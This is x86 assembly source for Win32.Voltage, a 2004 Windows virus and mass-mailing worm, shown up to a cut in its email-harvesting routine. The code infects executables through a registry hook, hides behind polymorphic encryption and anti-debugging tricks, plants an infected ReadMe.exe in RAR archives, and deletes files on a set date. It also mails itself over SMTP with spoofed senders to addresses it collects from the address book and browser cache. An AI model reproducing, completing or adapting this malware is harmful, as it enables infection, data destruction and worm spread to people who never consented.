;	I-Worm\Win32.Voltage by DR-EF (c) 2004,Version 2.2
;	--------------------------------------------------
;	
;	Virus Name:Win32.Voltage
;	Virus Size:22k
;	Type:PE\RAR Infector\Mail worm
;	Author:DR-EF
;
;	Virus Features:
;	---------------
;	- use the registry shell spawning technice to infect exe files
;	  when they executed
;	- encrypted by 2 layers
;	- use EPO
;	- polymorphic engine can generate diffrent instructions for the
;	  same action,mixed with junk code + using SEH to jump to host
;	- infect rar files by adding infected file\dropper
;	- anti debugging features
;	
;	Mail Worm Features:
;	-------------------
;	- 5 messages,subjects,filenames
;	- SMTP engine + base64 encoder
;	- collect mails from WAB & temporary internet files
;	- spoof mailfrom
;
;	Fixed Bugs From Old Versions:
;	-----------------------------
;	- search kernel base with SEH walker instead of last stack method
;	- dont set code flag at last section,only read/write
;	- fixed bug with image size of infected files
;	- removed 1 section in the dropper (wvltg.exe)
;	- replaced the CheckFileName function



.386
.model flat

	extrn	MessageBoxA:proc
	
	DEBUG		equ	0	;switch debug version on\off
	VirusSize	equ	(VirusEnd-_main)
	EncryptedVirus	equ	(EncryptedVirusEnd-(_main+EncryptionStart))

.data
	db	?
	
.code

_main:	
	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]
	add	esp,0ch				;restore stack
	call	DecryptVirus
	EncryptionStart	equ	($-_main)
	mov	esp,[esp + 8h]			;restore stack
	pop	dword ptr fs:[0]
	add	esp,4h
	VirusStart	equ	$
	call	Delta
Delta:	pop	ebp
	sub	ebp,offset Delta
	call	FindKernel
	jmp	SearchGetProcAddress
	
Wvltg_EntryPoint:
	call	Delta_					;get delta offset
Delta_:	pop	ebp
	sub	ebp,offset Delta_
	lea	eax,[ebp + Exit_V]
	push	eax
	pushad
	jmp	VirusStart
	
	
FindKernel:						;find kernel using SEH walker
        mov eax,fs:[0]
search_last:
        mov edx,[eax]
        inc edx
        jz found_last
        dec edx
        xchg edx,eax
        jmp search_last
found_last:
        mov eax,[eax+4]
        and eax,0ffff0000h
search_mz:
        cmp word ptr [eax],'ZM'
        jz found_mz
        sub eax,10000h
        jmp search_mz
found_mz:
	mov	[ebp + kernel32base],eax
	ret
	
	kernel32base	dd	0
	_GetProcAddress	db	"GetProcAddress",0
	__GetProcAddress	dd	0
	ApiNamesTable:
	
	_CreateFile	db	"CreateFileA",0
	_CloseHandle	db	"CloseHandle",0
	_CreateFileMapping	db "CreateFileMappingA",0
	_MapViewOfFile	db 	"MapViewOfFile",0
	_UnmapViewOfFile	db 	"UnmapViewOfFile",0
	_GetCommandLine	db	"GetCommandLineA",0
	_CreateProcess	db	"CreateProcessA",0
	_LoadLibrary	db	"LoadLibraryA",0
	_FreeLibrary	db	"FreeLibrary",0
	GetSystemDirectoryA	db	"GetSystemDirectoryA",0
	lstrcatA	db	"lstrcatA",0
	_GetModuleFileName	db	"GetModuleFileNameA",0
	_SetFileAttributesA	db	"SetFileAttributesA",0
	_GetStartupInfoA	db	"GetStartupInfoA",0
	_GetFileSize	db	"GetFileSize",0
	_SetFilePointer	db	"SetFilePointer",0
	_SetEndOfFile	db	"SetEndOfFile",0
	_GetTickCount	db	"GetTickCount",0
	_GlobalAlloc	db	"GlobalAlloc",0
	_GlobalFree	db	"GlobalFree",0
	_GetLocalTime	db	"GetLocalTime",0
	_GetFileAttributes	db	"GetFileAttributesA",0
	_GetFileTime	db	"GetFileTime",0
	_SetFileTime	db	"SetFileTime",0
	_DeleteFile	db	"DeleteFileA",0
	_CreateMutexA	db	"CreateMutexA",0
	_OpenMutexA	db	"OpenMutexA",0
	_FindFirstFileA	db	"FindFirstFileA",0
	_FindNextFileA	db	"FindNextFileA",0
	_SetCurrentDirectoryA	db	"SetCurrentDirectoryA",0
	_WriteFile	db	"WriteFile",0
	_FindClose	db	"FindClose",0
	_MultiByteToWideChar	db	"MultiByteToWideChar",0
	_ExitProcess	db	"ExitProcess",0
	
	ApiAddressTable:
	
	CreateFile	dd	0
	CloseHandle	dd	0
	CreateFileMapping	dd	0
	MapViewOfFile	dd	0
	UnMapViewOfFile	dd	0
	GetCommandLine	dd	0
	CreateProcess	dd	0
	LoadLibrary	dd	0
	FreeLibrary	dd	0
	GetSystemDirectory	dd	0
	lstrcat		dd	0
	GetModuleFileName	dd	0
	SetFileAttributes	dd	0
	GetStartupInfo	dd	0
	GetFileSize	dd	0
	SetFilePointer	dd	0
	SetEndOfFile	dd	0
	GetTickCount	dd	0
	GlobalAlloc	dd	0
	GlobalFree	dd	0
	GetLocalTime	dd	0
	GetFileAttributes	dd	0
	GetFileTime	dd	0
	SetFileTime	dd	0
	DeleteFile	dd	0
	CreateMutex	dd	0
	OpenMutex	dd	0
	FindFirstFile	dd	0
	FindNextFile	dd	0
	SetCurrentDirectory	dd	0
	WriteFile	dd	0
	FindClose	dd	0
	MultiByteToWideChar	dd	0
	ExitProcess	dd	0
	
	NumberOfApis	equ	34
	

SearchGetProcAddress:
	mov	eax,[ebp + kernel32base]
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[ebp + kernel32base]
	;eax - kernel32 export table
	push	eax
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[ebp + kernel32base]
	mov	edi,[eax]
	add	edi,[ebp + kernel32base]
	;edi - api names array
	dec	edi
nxt_cmp:inc	edi
	lea	esi,[ebp + _GetProcAddress]
	mov	ecx,0eh
	rep	cmpsb
	je	search_address
	inc	edx
nxt_l:	cmp	byte ptr [edi],0h
	je	nxt_cmp
	inc	edi
	jmp	nxt_l
search_address:
	pop	eax
	;eax - kernel32 export table
	;edx - GetProcAddress position
	shl	edx,1h
	mov	ebx,[eax + 24h]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,[ebp + kernel32base]
	mov	[ebp + __GetProcAddress],ebx
	mov	ecx,NumberOfApis
	lea	eax,[ebp + ApiNamesTable]
	lea	ebx,[ebp + ApiAddressTable]
	mov	edx,[ebp + kernel32base]
	call	get_apis
	jc	Do_Virus_Actions
	jmp	ReturnToHost
Do_Virus_Actions:
	pushad
	lea	eax,[ebp + AntiDebug]
	push	eax
	xor	eax,eax
	push	dword ptr fs:[eax]
	mov	fs:[eax],esp
	mov	[eax],ebx		;force debugger to jump
AntiDebug:
	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]
	add	esp,4h
	popad
	call	CrashDebuggers		;now if we under debugger we simple crash
	call	GetADVAPI32Apis
	jnc	ReturnToHost
	call	GetUser32Apis		;used for debug and payload
	jnc	ReturnToHost
	call	AntiLamers
	call	HideVirus
	call	ProcessCommandLine
	cmp	byte ptr [ebp + RunFromExeHooker],1h ;we run from virus exe hooker ?
	je	ExecuteAndInfectFile
	call	InstallVirus
	jmp	ReturnToHost
ExecuteAndInfectFile:
	mov	byte ptr [ebp + Infection_Success],0h
	call	InfectFile
	call	InstallVirus
	call	PayLoad
	call	ExecuteFile
	call	MassMail
	lea	eax,[ebp + FileDirectory]
	call	ScanDirectoryForRarFiles
ReturnToHost:
	cmp	byte ptr [ebp + RunFromExeHooker],1h
	jne	RetHost
Exit_V:
	push	eax			;if we running from virus exe hooker
	call	[ebp + ExitProcess]	;we simple exit
RetHost:popad
	db	64h,0a1h,0,0,0,0	;mov eax,fs:[00000000]
	dec	ebx
	ret
	
	CopyRight	db	"Win32.Voltage Virus Written By DR-EF (c) 2004",0
	SizeOfCopyRight	equ	($-CopyRight)
	
AntiLamers:
	lea	edx,[ebp + CopyRight]		;)
	mov	ecx,SizeOfCopyRight		
	xor	eax,eax				
	call	xcrc32				
	cmp	eax,0C3F9A421h			
	je	NoRip				
	xor	esp,esp				
NoRip:	ret					
	
	
GetUser32Apis:
	lea	eax,[ebp + User32dll]
	push	eax
	call	[ebp + LoadLibrary]
	xchg	eax,edx
	mov	ecx,NumberOfUser32Functions
	lea	eax,[ebp + user32_functions_sz]
	lea	ebx,[ebp + user32_functions_addresses]
	call	get_apis
	ret
	
	User32dll	db	"User32.dll",0
	user32_functions_sz:
	
	_MessageBox	db	"MessageBoxA",0
	_SetWindowTextA	db	"SetWindowTextA",0
	
	user32_functions_addresses:
	
	MessageBox	dd	0
	SetWindowText	dd	0
	
	NumberOfUser32Functions	equ	2
	
		
CrashDebuggers:	
	lea	eax,[ebp + _IsDebuggerPresent]
	push	eax
	push	[ebp + kernel32base]
	call	[ebp + __GetProcAddress]
	cmp	eax,0h
	je	NoIDP
	call	eax
	cmp	eax,0h
	je	NoIDP
	xor	esp,esp		;hang debuggers
NoIDP:	ret
	
	_IsDebuggerPresent	db	"IsDebuggerPresent",0
	
	
;eax - pointer to directory name:
ScanDirectoryForRarFiles:
	push	eax
	call	[ebp + SetCurrentDirectory]
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitRarScan
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	lea	eax,[ebp + RarFiles]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitRarScan
	mov	[ebp + hfind],eax	;save search handle
@rar:	call	InfectRar
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	push	dword ptr [ebp + hfind]
	call	[ebp + FindNextFile]
	cmp	eax,0h
	jne	@rar
ExitRarScan:
	ret
		
	RarFiles	db	"*.rar",0

;rar archive infection procedure:
;tested with rar archive's that created using winrar v3.20
InfectRar:
	call	InitRandomNumber
	cmp	[ebp + nFileSizeLow],300000h
	ja	ExitRarInfection		;do not infect files that are bigger than 3mb
	cmp	byte ptr [ebp + Infection_Success],0h
	je	usewvltg
	xor	ecx,ecx
	lea	esi,[ebp + FileToInfect]
GetLen:	cmp	byte ptr [esi],0h
	je	CopyPth
	inc	ecx
	inc	esi
	jmp	GetLen
CopyPth:inc	ecx
	lea	esi,[ebp + FileToInfect]
	lea	edi,[ebp + InfectedDropper]		;use infected file
	rep	movsb
	jmp	OpenDropper
usewvltg:	
	push	0ffh
	lea	eax,[ebp + InfectedDropper]
	push	eax
	push	0h
	call	[ebp + GetModuleFileName]	;use virus dropper
	cmp	eax,0h
	je	ExitRarInfection
OpenDropper:	
	xor	eax,eax
	push	eax
	push	eax
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + InfectedDropper]
	push	eax
	call	[ebp + CreateFile]		;open the infected dropper
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitRarInfection
	mov	[ebp + hInfectedDropper],eax
	push	0h
	push	eax
	call	[ebp + GetFileSize]		;get dropper file size
	cmp	eax,0ffffffffh
	je	ExitAndCloseDropperFile
	mov	[ebp + DropperSize],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	dword ptr [ebp + hInfectedDropper]
	call	[ebp + CreateFileMapping]	;create file mapping object for the dropper
	cmp	eax,0h
	je	ExitAndCloseDropperFile
	mov	[ebp + hDropperMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	dword ptr [ebp + hDropperMap]
	call	[ebp + MapViewOfFile]		;map dropper into memory
	cmp	eax,0h
	je	ExitAndCloseDropperMap
	mov	[ebp + DropperMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + cFileName]
	push	eax
	call	[ebp + CreateFile]		;open rar file
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitAndUnMapDropper
	mov	[ebp + hRarFile],eax
	xor	eax,eax
	push	eax
	mov	eax,[ebp + nFileSizeLow]
	add	eax,[ebp + DropperSize]
	add	eax,RarHeaderSize
	sub	eax,7h				;overwrite rar file sign
	push	eax
	xor	eax,eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hRarFile]
	call	[ebp + CreateFileMapping]	;create file mapping object of the rar file
	cmp	eax,0h
	je	ExitAndCloseRarFile
	mov	[ebp + hRarMap],eax
	mov	eax,[ebp + nFileSizeLow]
	add	eax,[ebp + DropperSize]
	add	eax,RarHeaderSize
	sub	eax,7h				;overwrite rar file sign
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hRarMap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	ExitAndCloseRarMap
	mov	[ebp + RarMap],eax
	cmp	dword ptr [eax],"!raR"		;is rar file ?
	jne	RarFileInfectionErr
	cmp	byte ptr [eax + 0fh],1h		;is already infected ?
	je	RarFileInfectionErr
	xor	eax,eax
	mov	edx,[ebp + DropperMap]
	mov	ecx,[ebp + DropperSize]
	call	xcrc32				;get infected dropper crc32 checksum
	mov	dword ptr [ebp + FILE_CRC],eax	;set it insaid rar header
	mov	eax,dword ptr [ebp + ftCreationTime + 4]
	mov	dword ptr [ebp + FTIME],eax	;set random time\data
	pushad
	mov	ecx,6h
	lea	edi,[ebp + FileInsaidRar]
@RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@RandLetter			;gen random name for the infected dropper
	popad
	mov	eax,[ebp + DropperSize]
	mov	[ebp + PACK_SIZE],eax
	mov	[ebp + UNP_SIZE],eax		;set dropper size insaid of rar header
	xor	eax,eax
	lea	edx,[ebp + headcrc]
	mov	ecx,(EndRarHeader-RarHeader-2)
	call	xcrc32				;get crc32 checksum of the rar header
	mov	word ptr [ebp + HEAD_CRC],ax	;and set it in rar header
	lea	esi,[ebp + RarHeader]
	mov	edi,[ebp + RarMap]
	add	edi,[ebp + nFileSizeLow]
	sub	edi,7h				;overwrite rar file sign
	push	edi
	mov	ecx,RarHeaderSize
	rep	movsb				;write the rar header into rar file
	mov	esi,[ebp + DropperMap]
	pop	edi
	add	edi,RarHeaderSize
	mov	ecx,[ebp + DropperSize]
	rep	movsb				;write the infected dropper into rar file
	mov	eax,[ebp + RarMap]
	push	eax
	inc	byte ptr [eax + 0fh]		;mark the rar file as infected(0fh=reserved1)
	mov	edx,eax
	xor	eax,eax
	add	edx,9h
	mov	ecx,0bh
	call	xcrc32				;get crc32 of the rar main header
	pop	ebx
	mov	word ptr [ebx + 7h],ax		;[ebx + 7h]=HEAD_CRC
ExitAndUnMapRarFile:
	push	[ebp + RarMap]
	call	[ebp + UnMapViewOfFile]
ExitAndCloseRarMap:
	push	dword ptr [ebp + hRarMap]
	call	[ebp + CloseHandle]
ExitAndCloseRarFile:
	push	dword ptr [ebp + hRarFile]
	call	[ebp + CloseHandle]
ExitAndUnMapDropper:
	push	dword ptr [ebp + DropperMap]	
	call	[ebp + UnMapViewOfFile]
ExitAndCloseDropperMap:
	push	dword ptr [ebp + hDropperMap]
	call	[ebp + CloseHandle]
ExitAndCloseDropperFile:
	push	dword ptr [ebp + hInfectedDropper]
	call	[ebp + CloseHandle]
ExitRarInfection:
	ret
RarFileInfectionErr:
	push	FILE_BEGIN
	push	0h
	push	dword ptr [ebp + nFileSizeLow]
	push	dword ptr [ebp + hRarFile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hRarFile]
	call	[ebp + SetEndOfFile]
	jmp	ExitAndUnMapRarFile
	
	
	InfectedDropper		db	0ffh	dup(0)
	hInfectedDropper	dd	0
	DropperSize		dd	0
	hDropperMap		dd	0
	DropperMap		dd	0
	hRarFile		dd	0
	hRarMap			dd	0
	RarMap			dd	0
	
	
	
RarHeader:
		HEAD_CRC	dw	0h
	headcrc:HEAD_TYPE	db	74h
		HEAD_FLAGS	dw	8000h	;normal flag
		HEAD_SIZE	dw	RarHeaderSize
		PACK_SIZE	dd	0h
		UNP_SIZE	dd	0h
		HOST_OS		db	0h	;Ms-Dos
		FILE_CRC	dd	0h
		FTIME		dd	0h
		UNP_VER		db	14h
		METHOD		db	30h	;storing
		NAME_SIZE	dw	0ah	;file name size
	endhcrc:ATTR		dd	0h
	FileInsaidRar	equ	$
		FILE_NAME	db	"ReadMe.exe"
	EndRarHeader:
RarHeaderSize	equ	($-RarHeader)	
	

;(c) z0mbie/29a crc32 function
; input:  EDX=data, ECX=size, EAX=crc
; output: EAX=crc, EDX+=ECX, ECX=BL=0
xcrc32:	jecxz   @@4			
	not     eax
@@1:	xor     al, [edx]
	inc     edx
	mov     bl, 8
@@2:	shr     eax, 1
	jnc     @@3
	xor     eax, 0EDB88320h
@@3:	dec     bl
	jnz     @@2
	loop    @@1
	not     eax
@@4:	ret

	
		
HideVirus:				;hide virus process from alt+crtl+del menu
	lea	eax,[ebp + RSP]
	push	eax
	push	dword ptr [ebp + kernel32base]
	call	[ebp + __GetProcAddress]
	cmp	eax,0h
	je	ExitRSP
	push	1
	push	0
	call	eax
ExitRSP:ret
	
	RSP	db	"RegisterServiceProcess",0
	
		
	
PayLoad:
	lea	eax,[ebp + SYSTEMTIME]
	push	eax
	call	[ebp + GetLocalTime]
	cmp	word ptr [ebp + wMonth],0ch
	jne	ExitPayload
	cmp	word ptr [ebp + wDay],1eh
	jne	Payload2
	;replace all windows title with copyright message
	mov	ecx,0ffffh
payl0ad:push	ecx
	lea	eax,[ebp + CopyRight]
	push	eax
	push	ecx
	call	[ebp + SetWindowText]
	pop	ecx
	loop	payl0ad
	;show payload message box:
	push	MB_SYSTEMMODAL or MB_ICONINFORMATION
	lea	eax,[ebp + CopyRight]
	push	eax
	push	eax
	push	0h
	call	[ebp + MessageBox]
Payload2:
	;fuck ppl data
	cmp	word ptr [ebp + wDay],1dh
	jne	ExitPayload
	lea	eax,[ebp + FileDirectory]
	push	eax
	call	[ebp + SetCurrentDirectory]	;goto running program directory
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	lea	eax,[ebp + search_mask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitPayload
	mov	[ebp + hfind],eax		;save search handle
@Love:
IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + warning2]
	push	eax
	lea	eax,[ebp + cFileName]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	SkipFile
ENDIF
	lea	eax,[ebp + cFileName]
	push	eax
	call	[ebp + DeleteFile]
SkipFile:
IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + StopPayload]
	push	eax
	lea	eax,[ebp + cFileName]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	je	ExitPayload
ENDIF
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	push	dword ptr [ebp + hfind]
	call	[ebp + FindNextFile]
	cmp	eax,0h
	jne	@Love
ExitPayload:
	ret
	
	MB_SYSTEMMODAL	equ	00001000h
	MB_ICONINFORMATION	equ	00000040h
	
IF	DEBUG
	warning2	db	"Voltage Virus is going to delete this file:",0
	StopPayload	db	"Stop Payload ?",0
ENDIF
	
	hfind	dd	0
	search_mask	db	"*.*",0
	
	
WIN32_FIND_DATA:
	dwFileAttributes	dd	0
	ftCreationTime		dq	0
	ftLastAccessTime	dq	0
	ftLastWriteTime		dq	0
	nFileSizeHigh		dd	0
	nFileSizeLow		dd	0
	dwReserved0		dd      0
	dwReserved1		dd      0
	cFileName		db      0ffh dup (0)
	cAlternateFileName	db	14 dup (0)
	
	
	
GetADVAPI32Apis:
	lea	eax,[ebp + ADVAPI32dll]
	push	eax
	call	[ebp + LoadLibrary]
	xchg	eax,edx
	mov	ecx,NumberOfRegFunctions
	lea	eax,[ebp + reg_functions_sz]
	lea	ebx,[ebp + reg_function_addresses]
	call	get_apis
	ret

	ADVAPI32dll	db	"ADVAPI32.DLL",0
	
	reg_functions_sz:

	_RegOpenKeyExA	db	"RegOpenKeyExA",0
	_RegSetValueExA	db	"RegSetValueExA",0
	_RegCloseKey	db	"RegCloseKey",0
	_RegQueryValueEx	db	"RegQueryValueExA",0
	
	reg_function_addresses:
	
	RegOpenKeyEx	dd	0
	RegSetValueEx	dd	0
	RegCloseKey	dd	0
	RegQueryValueEx	dd	0
	
	NumberOfRegFunctions	equ	4
	
	
	
MassMail:
	;send the virus to all email addresses that the virus
	;found in the Windows address book file.and temporary
	;internet files
	pushad					;set SEH
	lea	eax,[ebp + MM_SEH_Handler]
	push	eax
	xor	eax,eax
	push	dword ptr fs:[eax]
	mov	fs:[eax],esp
	call	CheckConditions			;check for some conditions before sending mails
	jnc	ExitMM
	call	AllowOnlyOneRun			;use mutex to alow only one execute of the mail
	jnc	ExitMM				;worm
	call	GetWinsockApis			;get all needed apis from winsock library	
	jnc	ExitMM
	call	GetSMTPServer			;get the default smtp server from the registry
	jnc	FreeWSLibraryAndExit
	call	CreateVirusBase64Image		;base64 encode of infected file
	jnc	FreeWSLibraryAndExit
	call	ScanWAB				;get email addresses from the windows address book
	call	SearchEmailsInHTMFiles		;and also from temporary internet files
	call	ConnectToServer			;connect to server
	jnc	FreeBase64Mem
	call	[ebp + GetTickCount]
	mov	[ebp + MessageNumber],al	;select random message
	call	__recv				;recv server message:
	cmp	eax,SOCKET_ERR
	je	Disconnect
	cmp	eax,0h
	je	Disconnect
	lea	eax,[ebp + GetBuffer]
	cmp	dword ptr [eax]," 022"		;is 220 ?
	jne	Disconnect
	;send HELO command:
	push	0h
	push	SizeOfHELO
	lea	eax,[ebp + HELO]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv				;get server message
	cmp	eax,SOCKET_ERR
	je	Disconnect
	cmp	eax,0h
	je	Disconnect
	lea	eax,[ebp + GetBuffer]
	cmp	dword ptr [eax]," 052"		;is 250 ?
	jne	Disconnect
	;send the mail from command:
	push	0h
	cmp	byte ptr [ebp + MessageNumber],32h
	ja	mfrom
	push	SizeOfMailFrom1
	lea	eax,[ebp + MAILFROM1]
	push	eax
	jmp	mfromok
mfrom:	cmp	byte ptr [ebp + MessageNumber],64h
	ja	mfrom2
	push	SizeOfMailFrom2
	lea	eax,[ebp + MAILFROM2]
	push	eax
	jmp	mfromok
mfrom2:	cmp	byte ptr [ebp + MessageNumber],96h
	ja	mfrom3
	push	SizeOfMailFrom3
	lea	eax,[ebp + MAILFROM3]
	push	eax
	jmp	mfromok
mfrom3:	cmp	byte ptr [ebp + MessageNumber],0c8h
	ja	mfrom4
	push	SizeOfMailFrom4
	lea	eax,[ebp + MAILFROM4]
	push	eax
	jmp	mfromok
mfrom4:	push	SizeOfMailFrom5
	lea	eax,[ebp + MAILFROM5]
	push	eax
mfromok:push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv				;get server message:
	cmp	eax,SOCKET_ERR
	je	Disconnect
	cmp	eax,0h
	je	Disconnect
	lea	eax,[ebp + GetBuffer]
	cmp	dword ptr [eax]," 052"		;is 250 ?
	jne	Disconnect
	;send RCPT command
	xor	ecx,ecx
	mov	esi,[ebp + hMailAddresses]
	mov	cx,[ebp + NumberOfMailAddresses]
	cmp	ecx,1h
	jbe	MailsFromFiles
@NxtAdd:push	ecx
	push	0h
	push	SizeOfRcpt
	lea	edx,[ebp + RCPT]
	push	edx
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]			;send start of RCPT command
	push	esi
	xor	ecx,ecx
AddSize:inc	ecx				;get email address size
	inc	esi
	cmp	byte ptr [esi],0h
	jne	AddSize	
	pop	esi				;pointer to email addresses array
	push	0h
	push	ecx
	push	esi
	add	esi,ecx				;move to next address
	inc	esi
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]			;send address
	push	0h
	push	SizeOfEndRcpt
	lea	eax,[ebp + EndOfRCPT]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]			;send the end or rcpt command
	call	__recv				;get server message
	pop	ecx
	loop	@NxtAdd				;and move to next mail address
MailsFromFiles:					;send mails to ppl that we found in temporary internet files
	cmp	word ptr [ebp + NumberOfEmails],28h
	jb	_1___				;is number of mails > 40 ?
	mov	[ebp + NumberOfEmails],1eh	;send 30 emails
_1___:	xor	ecx,ecx
	mov	cx,[ebp + NumberOfEmails]	;number of mails
	mov	esi,[ebp + MailsMemory]		;pointer to mails array
@nM:	push	ecx				;next mail
	push	0h
	push	SizeOfRcpt
	lea	edx,[ebp + RCPT]
	push	edx
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]			;send start of RCPT command
	xor	ecx,ecx
	push	esi
Csize:	inc	ecx
	inc	esi
	cmp	byte ptr [esi],0h
	jne	Csize				;calc mail address size
	pop	esi				;restore pointer to mail address
	push	0h
	push	ecx
	push	esi
	add	esi,ecx
	inc	esi				;move to next email
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	push	0h
	push	SizeOfEndRcpt
	lea	eax,[ebp + EndOfRCPT]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	call	__recv
	pop	ecx
	loop	@nM
	;send data command
	push	0h
	push	SizeOfData
	lea	eax,[ebp  + __DATA]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	;get server message
	call	__recv
	cmp	eax,SOCKET_ERR
	je	Disconnect
	cmp	eax,0h
	je	Disconnect
	lea	eax,[ebp + GetBuffer]
	cmp	dword ptr [eax]," 453"	;is 354 ?
	jne	Disconnect
	;send from and subject
	push	0h
	cmp	byte ptr [ebp + MessageNumber],32h
	ja	_fs
	push	SizeOfFromAndSubject1
	lea	eax,[ebp + FromAndSubject1]
	push	eax
	jmp	smimeh	
_fs:	cmp	byte ptr [ebp + MessageNumber],64h
	ja	_fs2
	push	SizeOfFromAndSubject2
	lea	eax,[ebp + FromAndSubject2]
	push	eax
	jmp	smimeh	
_fs2:	cmp	byte ptr [ebp + MessageNumber],96h
	ja	_fs3
	push	SizeOfFromAndSubject3
	lea	eax,[ebp + FromAndSubject3]
	push	eax
	jmp	smimeh
_fs3:	cmp	byte ptr [ebp + MessageNumber],0c8h
	ja	_fs4
	push	SizeOfFromAndSubject4
	lea	eax,[ebp + FromAndSubject4]
	push	eax
	jmp	smimeh
_fs4:	push	SizeOfFromAndSubject5
	lea	eax,[ebp + FromAndSubject5]
	push	eax
smimeh:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	;send the mime header
	push	0h
	push	SizeOfMessageMimeHeader
	lea	eax,[ebp + MessageMimeHeader]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	;send message and attachment name
	push	0h
	cmp	byte ptr [ebp + MessageNumber],32h
	ja	_ma
	push	SizeOfMessageAndFileName1
	lea	eax,[ebp + MessageAndFileName1]
	push	eax
	jmp	sattch	
_ma:	cmp	byte ptr [ebp + MessageNumber],64h
	ja	_ma2
	push	SizeOfMessageAndFileName2
	lea	eax,[ebp + MessageAndFileName2]
	push	eax
	jmp	sattch
_ma2:	cmp	byte ptr [ebp + MessageNumber],96h
	ja	_ma3
	push	SizeOfMessageAndFileName3
	lea	eax,[ebp + MessageAndFileName3]
	push	eax
	jmp	sattch
_ma3:	cmp	byte ptr [ebp + MessageNumber],0c8h
	ja	_ma4
	push	SizeOfMessageAndFileName4
	lea	eax,[ebp + MessageAndFileName4]
	push	eax
	jmp	sattch
_ma4:	push	SizeOfMessageAndFileName5
	lea	eax,[ebp + MessageAndFileName5]
	push	eax
sattch:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	;send the attachment
	mov	ecx,[ebp + sizeofbase64out]
	mov	eax,[ebp + base64outputmem]
	push	0h
	push	ecx
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	;send end of mail
	push	0h
	push	SizeOfEndOfMail
	lea	eax,[ebp + EndOfMail]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	;get server message
	call	__recv
	;send quit command
QuitM:	push	0h
	push	SizeOfQuit
	lea	eax,[ebp + QUIT]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
Disconnect:	
	push	dword ptr [ebp + vsocket]
	call	[ebp + closesocket]
	call	[ebp + WSACleanup]
FreeBase64Mem:
	push	[ebp + base64outputmem]
	call	[ebp + GlobalFree]
FreeWSLibraryAndExit:
	push	dword ptr [ebp + hWinsock]
	call	[ebp + FreeLibrary]
FreeWabMemAndExit:
	push	dword ptr [ebp + hMailAddresses]
	call	[ebp + GlobalFree]
	push	dword ptr [ebp + MailsMemory]
	call	[ebp + GlobalFree]
ExitMM:	pop	dword ptr fs:[0]
	add	esp,4h
	popad
	ret
MM_SEH_Handler:
	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]
	add	esp,4h
	popad
	ret


	MessageNumber	db	0


AllowOnlyOneRun:
	;use mutex to check if we already running
	lea	eax,[ebp + CopyRight]
	push	eax
	push	0h
	push	MUTEX_ALL_ACCESS
	call	[ebp + OpenMutex]
	cmp	eax,0h
	jne	AlreadyRun
	lea	eax,[ebp + CopyRight]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + CreateMutex]
	stc
	ret
AlreadyRun:
	clc
	ret
	
	MUTEX_ALL_ACCESS	equ	001F0001h
	

__recv:
	push	0h
	push	0ffh
	lea	eax,[ebp + GetBuffer]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + recv]
	ret


;scan all .htm,asp,xml temporary files for email addresses
SearchEmailsInHTMFiles:
IF	DEBUG
	call	SetDebugDir
	db	"C:\w32_Voltage_V2\TempInetFiles",0
SetDebugDir:
	call	[ebp + SetCurrentDirectory]
	jmp	____1_
ENDIF
	lea	eax,[ebp + shell_dll]
